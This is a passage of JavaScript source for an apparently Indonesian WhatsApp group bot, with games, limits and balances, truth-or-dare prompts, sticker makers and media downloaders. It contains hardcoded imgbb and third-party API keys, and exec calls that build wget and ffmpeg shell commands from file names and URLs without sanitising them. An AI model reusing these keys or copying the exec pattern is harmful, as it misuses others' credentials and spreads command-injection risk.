                     if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                     if (game.isTebakBendera(from, tebakbendera)) return reply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakbendera.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    reply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : Bendera negara manakah itu ${randKey.bendera}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.jawaban.toLowerCase()
                    game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
                    gameAdd(sender, glimit)
                     }
                    break
          
           
           
           case 'tebakgambar':{
                  if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                  if (!isGroup) return reply(mess.only.group)
                  reply(mess.wait)
                  if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
                 data = fs.readFileSync('./lib/game/tebakgambar.js');
				  jsonData = JSON.parse(data);
				  randIndex = Math.floor(Math.random() * jsonData.length);
				  randKey = jsonData[randIndex];
                  const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                  sendMediaURL(from, randKey.result.soalImg, monospace(`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu} detik`), dev)
                  let anih = randKey.result.jawaban.toLowerCase()
                  game.addgambar(from, anih, gamewaktu, tebakgambar)
                  gameAdd(sender, glimit)
	               }
                   break  	 
           
           
           case 'tebaklirik': case 'tl':{
                      if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                      if (!isGroup) return reply(mess.only.group)
                      if (game.isTebakLirik(from, tebaklirik)) return reply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/tebaklirik.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];      
                      const petunjuk = randKey.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                      reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                      let anal = randKey.result.answer.toLowerCase()
                      game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
                      gameAdd(sender, glimit)
                        }
                      break 
           
           case 'siapaaku': case 'siapakahaku': case 'sa':{
                     if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                     if (!isGroup) return reply(mess.only.group)
                     if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/siapaaku.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                     reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.data.soal}\n\nWaktu : ${gamewaktu}s`)
                     let anau = randKey.data.jawaban.toLowerCase()
                     game.addsyiko(from, anau, gamewaktu, siapaaku)
                     gameAdd(sender, glimit)
                      }
                     break
           
           
           case 'tebakanime': case 'ta':{
                    if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                    if (!isGroup) return reply("Hanya bisa di group")
                    reply(mess.wait)
                    if (game.isTebakAnime(from, tebakanime)) return reply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakanime.js');
				    jsonData = JSON.parse(data);
			        randIndex = Math.floor(Math.random() * jsonData.length);
			        randKey = jsonData[randIndex];                                        
                    const petunjuk = randKey.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                    //sendMediaURL(from, randKey.result.image, monospace(`Silahkan tebak karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu}s`), dev)
                    reply(randKey.result.image)
                    let nurulsayank = randKey.result.name.toLowerCase()
                    game.addanime(from, nurulsayank, gamewaktu, tebakanime)
                    gameAdd(sender, glimit)
                    }
                    break
           
           
           
           
           
           
          
           
           case 'math':{
                       if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                       if (!isGroup) return reply(mess.only.group)
                       if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
                       if (!q) return reply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
                       let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}&apikey=GSdohIiH`)
                       reply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}`)
                       let anih = anu.data.jawaban.toLowerCase()
                       game.addmtk(from, anih, gamewaktu, mtk)
                       gameAdd(sender, glimit)
                       }
                       break
           
           
           case 'tebakkata': case 'tk':{
                   if (!isGroup) return reply(mess.only.group)
                   if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (game.isTebakKata(from, tebakkata)) return reply(`Masih ada soal yang belum di selesaikan`)
                   let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolkey}`)
                   reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.pertanyaan}\n\nWaktu : ${gamewaktu}s`)
                   let ahhh = anu.data.result.jawaban.toLowerCase()
                   game.addkata(from, ahhh, gamewaktu, tebakkata)
                   gameAdd(sender, glimit)
                    }
                   break
           
           
           

        
      case 'wait': case 'whatanime':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(yoooo)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return reply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    sendFileFromUrl(res.result[0].video, video, {quoted: dev, caption: teks})
                    limitAdd(sender, limit)
                    })    
                 .catch((err) => {                   
                   reply(mess.error.api)
                    })
                    } else if (isSticker || isQuotedSticker ) {
                    let encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                    let yoooo = await xdev.downloadAndSaveMediaMessage(encmedia)
                    let ran = getRandom('.png')
				  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
			        fs.unlinkSync(yoooo)
			    	if (err) return reply('Gagal :V')   
	                let bodyForm = new FormData();
        	        bodyForm.append('image', fs.createReadStream(ran)) 
                    fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
                    .then(async(res) =>{
                    if (res.result && res.result.length <= 0) return reply('Anime not found! :(')
                    let teks = ''
                    if (res.result[0].similarity < 0.92) {
                        teks = '*Low similarity. 🤔*\n\n'
                    }
                    teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
                    xdev.sendFileFromUrl(from, res.result[0].video, teks, msg)
                    limitAdd(sender, limit)
                    fs.unlinkSync(ran)
                    })
                 .catch((err) => {       
                            reply(mess.error.api)
                        })
               })
                 } else {
                   reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
                }
               }
               break
        
        
        
        case 'tourl': case 'imagetorul': case 'imgtourl': case 'audiotourl': case 'videotourl': case 'stickertourl': case 'stikertourl': case 'tolink':
									var imgbb = require('imgbb-uploader')
									if (isQuotedAudio) {
										ger = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										reply(mess.wait)
										owgi = await xdev.downloadAndSaveMediaMessage(ger)
										Okelor = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
										teks=`]─ 「 *AUDIO TO URL* 」 ─[

Url : ${Okelor.display_url}`
										reply2(teks)
 
										} else if (isQuotedImage) {
											ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
											reply(mess.wait)
											owgi = await xdev.downloadAndSaveMediaMessage(ger)
											qbc = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
											teks=`─ 「 *IMAGE TO URL* 」 ─

Url : ${qbc.display_url}`
											reply2(teks)
											} else if (isQuotedVideo) {
												ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
												reply(mess.wait)
												owgi = await xdev.downloadAndSaveMediaMessage(ger)
												ffff = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
												teks=`]─ 「 *VIDEO TO URL* 」 ─[

Url : ${ffff.display_url}`
												reply2(teks)
												} else if (isQuotedSticker) {
													ger = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
													reply(mess.wait)
													owgi = await xdev.downloadAndSaveMediaMessage(ger)
													vrr = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
													teks=`]─ 「 *STICKER TO URL* 」 ─[

Url : ${vrr.display_url}`
													reply2(teks)
												}
											break
        
        
        
        
        case 'setbio':
        case 'setbiobot':
                                     {
									 if (!isOwner && !dev.key.fromMe) return reply("Khusus Owner")
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Paijo`)
									autobio = false
									await xdev.setStatus(q)
									.then((res) => reply(`Berhasil mengganti status bio ke ${q}`))
									.catch((err) => reply('waduh error'))
									}
									break
        
        
        
        
        
        
           
           case 'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					xdev.sendMessage(from, cek, text, { quoted: dev })
					break
					
					
					
					case 'truth':
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					reply(`${ttrth}`) 
					break
			case 'dare':
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					reply(`${der}`) 
					break
	     
//******************** 》Limit《 ********************\\
       case 'topbalance':
                      if(!isGroup)return reply(mess.only.group)
                      xdev.updatePresence(from, Presence.composing)
                      let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
                      let mebn = [];
                      for (let i of balance){
                      mebn.push(i.id)
                      let bl = (i.balance)
                      txot += `*ID :* @${i.id.split("@")[0]}\n➸ Balance : ${bl}\n\n`
                      }
                      mentions(txot, mebn, true)
                      break
            case 'limit':
            case 'ceklimit': 
            case 'balance': 
            case 'glimit':
                      reply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                      break
            case 'buylimit':{
                       if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
                       if (q.includes('-')) return reply(`Jangan menggunakan -`)
                       if (isNaN(q)) return reply(`Harus berupa angka`)
                       let ane = Number(nebal(q) * 100)
                       if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                       kurangBalance(sender, ane, balance)
                       giveLimit(sender, nebal(q), limit)
                       reply(monospace(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
                       }
                       break
    
           
           
           
           case 'buyglimit':
                       {
                       if(!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
                       const koinPerlimit = 100
                       const total = koinPerlimit * q
                       if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
                       kurangBalance(sender, total, balance)
                       givegame(sender, q, glimit)
                       reply(monospace(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
                       }
                       break
          case 'giftlimit':
                       if(!isOwner)return
                       if (!q)return reply(`Example : ${prefix + command} @tag 10`)
                       lim = q.split(" ")[1]
                       const tag1 = `${q.split(" ")[0].replace("@",'')}@s.whatsapp.net`
                       giveLimit(tag1, lim, limit)
                       reply('Succes')
                       break
           
           
           
           
          
                  
            




      
          
        case 'listprem':
        case 'listpremium':
                   if(!isGroup)return reply(mess.only.group)
                   let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
                   let men = [];
                   for (let i of premium){
                   men.push(i.id)
                   let cekvip = ms(i.expired - Date.now())
                   txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
                   }
                   reply2(txt, men, true)
                   break
                   
                   case 'emoji':
                      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                      if (args.length == 0) return reply(`Example: ${prefix + command} wa 🗿

*LIST EMOJI*

ap = Emoji Apple
wa = Emoji Whatsapp
fb = Emoji Facebook
go = Emoji Google
mo = Emoji Mozilla
tw = Emoji Twitter
sa = Emoji Samsung

penggunaan : ${prefix + command } wa 🗿`)
                     emojis = args[0]
                     args.shift()
                     emoje = args.join(" ")
                     reply(mess.wait)
                     limitAdd(sender, limit)
                     switch (emojis) {
               case 'ap':
               case 'apple':
			             emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[0].url}`
    	         		sendStickerFromUrl(from,`${teks}`)	
             			console.log(teks)
   	  	     		})
                        break
              case 'wa':
              case 'whatsapp':
                         emoji.get(`${emoje}`).then(emoji => {
				         teks = `${emoji.images[4].url}`
      	       		sendStickerFromUrl(from,`${teks}`)	
    		         	console.log(teks)
   		     	 	})
                         break
              case 'fb':
              case 'facebook':
                        emoji.get(`${emoje}`).then(emoji => {
				        teks = `${emoji.images[6].url}`
          	  		sendStickerFromUrl(from,`${teks}`)	
    	        		console.log(teks)
        				})
                        break
              case 'go':
              case 'google':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[1].url}`
    	   	  	sendStickerFromUrl(from,`${teks}`)	
    	   	  	console.log(teks)
   			  	})
                     break
           case 'mo':
           case 'mozila':
                     emoji.get(`${emoje}`).then(emoji => {
				     teks = `${emoji.images[14].url}`
    			     sendStickerFromUrl(from,`${teks}`)	
    		     	console.log(teks)
   		      	})
                     break
            case 'tw':
                  emoji.get(`${emoje}`).then(emoji => {
				  teks = `${emoji.images[5].url}`
    	  		sendStickerFromUrl(from,`${teks}`)	
      			console.log(teks)
   				})
                  break
            case 'sa':
            case 'samsung':
                    emoji.get(`${emoje}`).then(emoji => {
				    teks = `${emoji.images[2].url}`
       	 		sendStickerFromUrl(from,`${teks}`)	
        			console.log(teks)
   	 			})
                   break
                   }
                   break
                   
                   
                   
                   
                   
                   
           case 'claim':   
            case 'klaim':
                    if (isClaimOn) return reply(mess.claimOnAlready)
                    var htgm6 = randomNomor(1000)
                    var htgm7 = randomNomor(20)
                    addBalance(sender, htgm6, balance)
                    giveLimit(sender, htgm7, balance)
                    _claim.push(sender)
                    fs.writeFileSync('./database/claim.json', JSON.stringify(_claim))
                    await reply(`*── 「 CLAIM  」 ──*

Selamat kamu mendapatkan *${htgm7}* Limit & *${htgm6}* balance
Dari claim harian`)
                    break
			
			
			
			
			
			
			
			
                   
                   
                   
                   
                   
        case 'cekprem': case 'cekpremium':
                   if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
                   let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                   let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
                   try {
                   ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
                   } catch {
                   ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                   }
                   teks = `❒ *「 Premium User 」* ❒ 
  
 *Nama : ${pushname}*
 *Tag : @${sender.split("@")[0]}*
 *Expired : ${premiumnya}*`
                    its = await getBuffer (ppimg)
                    xdev.sendMessage(from, its, image, {contextInfo: forward, caption: teks
                     })
                     break
                     
                     
           
           
           
           
case 'me': 
case 'profile':
case 'myprofile':
try {
ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
stst = await xdev.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
const prmm =  isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
teks = `
*╭─▸「 Profile User 」*
*│* Nama : ${pushname} 
*│* Tag : @${sender.split("@")[0]}
*│* Status : ${isPremium ? 'Premium':'Free'}
*│* Status Bot : ${isOwner ? 'Owner':'User'}
*│* Expired : ${prmm}
*│* Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}
*│* Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}
*│* Balance User : $${getBalance(sender, balance)}
*╰────────────[*`
its = await getBuffer (ppimg)
xdev.sendMessage(from, teks, text, { thumbnail: its, detecLinks: false, quoted: dev, contextInfo: { forward, externalAdReply:{title: `${pushname}`,body:`${stst}`,previewType:"PHOTO",thumbnail: its, sourceUrl:`https://wa.me/${senderNumber}`}}})
break 
           
           
           
           
           
           
           

           

           
           
           
     
           

           
           
           
           
           
           
           
           
           
          
           
           
           
           
           case 'tekschat':
           if(!q) return reply (`Teksnya mana ?\nContoh : ga ada menu bang`)
           teksChat = `${q}`
           reply(`
Berhasil mengganti teksChat Bot
jika ada yang command ke bot maka bot
akan menjawab : ${q}`)
       break    
           
           
           
    
    
      
      
           
           
        
                 
              
                 
                
            case 'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                reply(bi)
                break
            
           
					
					
					
           
           
          

           
           
           case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot1) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;
        



 
 
 
           case 'mediafire': 
                            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
                            if (args.length < 1) return reply('Link Nya Mana? ')
                            if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
                            reply(mess.wait)
                            teks = args.join(' ')
                            res = await mediafireDl(teks)
                            result = `Media Fire Downloader

 *Nama :* ${res[0].nama}
 *Ukuran :* ${res[0].size}
 *Link :* ${res[0].link}

 _*Tunggu Proses Mengirim Media......*_`
                         reply(result)
                         sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: dev})
                         limitAdd(sender, limit)
                         break
           
           
           
           
           
           
					
					
					
					
           case 'kbbi':
					if (args.length < 1) return reply('Apa yang mau dicari um?')
					asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					reply('Menurut Kbbi:\n\n'+asw.result)
					break
           
           
           
                
           
           
           
           
           
          
           case 'trigger':
           case 'triggered':
           if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
					reply(mess.wait)
					ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  xdev.downloadAndSaveMediaMessage(ger)
					anus = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anus.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply("Error")
					 xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
					fs.unlinkSync(rano)
					fs.unlinkSync(owgi)
					})
					} else {
					reply('Gunakan foto!')
					}
					limitAdd(sender, limit)
					break
           
           case 'wasted':
var imgbb = require('imgbb-uploader')
if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: dev
  reply(mess.wait)
  owgi = await xdev.downloadAndSaveMediaMessage(ger)
  anal = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
  teks = `${anal.display_url}`
  ranp = getRandom('.gif')
  rano = getRandom('.webp')
  anu1 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
  exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply("Errof")
nobg = fs.readFileSync(rano)
xdev.sendMessage(from, nobg, sticker, {
  quoted: dev
})
fs.unlinkSync(rano)
  })

} else {
  reply('Gunakan foto!')
}
break
           
           
           
           
           
           
           

           case "astetick":
    case "videoanime":
    case "storyanime":
    reply(mess.wait)
     Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)
     xdev.sendMessage(from, Iki, video, {quoted: dev, thumbnail: thumb })
     break
           
           
           
           
           
           case 'playvideo':
           case 'playvidio':
             if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
            if (!q) return reply('Judulnya apa kak ?')
            if(q.includes("youtube.com")) return reply("Judulnya musiknya aja kak")
           // if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
            teks = args.join(' ')
            res = await yts(`${teks}`).catch(e => {
               reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
            reply(mess.wait)
            res = await y2mateV(res.all[0].url).catch(e => {
            reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${res[0].judul}\`\`\`
\`\`\`🐥 Ext : MP4\`\`\`
\`\`\`🐥 Size : ${res[0].size}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: dev}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: dev, mimetype: 'video/mp4', filename: res[0].output})
})
            break
           
           
           case 'playaudio':
   if (!isPremium && !isOwner) return reply(`Kamu bukan user premium`)
  if(q.includes("youtube.com")) return reply("Judulnya musiknya aja kak")
               if (args.length < 1) return reply('Apa Yang Mau Dicari?')
               teks = args.join(' ')
               reply('Tunggu bentar kak')
               
               if (!teks.endsWith("-doc")){
               res = await yts(`${teks}`).catch(e => {
               reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
 
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
📬 ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
🎞️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}


*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: thumbInfo})
               res = await y2mateA(res.all[0].url).catch(e => {
               reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
              // if (res.all[0].timestamp >= 10:00) return reply("Maaf Durasi melebihi batas yang ditentukan, audio tidak akan di kirim")
               sendFileFromUrl(res[0].link, audio, {quoted: dev, mimetype: 'audio/mp4', filename: res[0].output})
}
               if (teks.endsWith("-doc")){
               const tec = teks.split("-doc")
               res = await yts(`${tec}`).catch(e => {
               reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
        
               let thumbInfo = `*Youtube Audio Downloader*
               
📜 Judul : ${res.all[0].title}
🎁 Type : mp3
?? ID : ${res.all[0].videoId}
🌐 Publikasi : ${res.all[0].ago}
??️ Ditonton : ${res.all[0].views}
⚖️ Durasi : ${res.all[0].timestamp}
🎥 Channel : ${res.all[0].author.name}
🖇️ Link : ${res.all[0].author.url}

*_Harap tunggu sebentar, file akan segera dikirim_*`

               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: thumbInfo})
